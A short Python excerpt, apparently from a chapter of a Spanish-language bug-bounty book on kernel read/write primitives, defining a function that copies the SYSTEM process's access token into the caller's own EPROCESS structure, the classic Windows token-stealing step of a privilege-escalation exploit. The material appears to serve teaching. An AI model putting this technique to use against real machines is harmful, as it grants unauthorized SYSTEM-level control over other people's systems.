# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
def steal_token(phys_memory, system_eprocess, our_eprocess):
    """Copia el token de SYSTEM a nuestro proceso."""
    system_token = phys_memory.read_qword(
        system_eprocess + OFFSET_TOKEN
    )
    phys_memory.write_qword(
        our_eprocess + OFFSET_TOKEN,
        system_token
    )
    # Después de esto, nuestro proceso tiene token de SYSTEM
